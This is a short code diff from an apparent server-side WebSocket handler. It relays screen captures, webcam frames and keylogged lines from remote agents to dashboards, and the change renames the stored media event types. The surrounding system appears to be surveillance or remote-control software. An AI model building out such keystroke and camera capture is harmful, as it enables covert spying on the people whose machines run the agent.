@@ -168,14 +168,14 @@ async def ws_agent(ws: WebSocket):
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_screen_to_dashboards(agent_id, frame)
                 try:
-                    await _store_media_event('screen', agent_id, frame)
+                    await _store_media_event('screen_image', agent_id, frame)
                 except Exception:
                     pass
             elif data.get('type') == 'camera_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_camera_to_dashboards(agent_id, frame)
                 try:
-                    await _store_media_event('camera', agent_id, frame)
+                    await _store_media_event('camera_image', agent_id, frame)
                 except Exception:
                     pass
             elif data.get('type') == 'keylog_line':
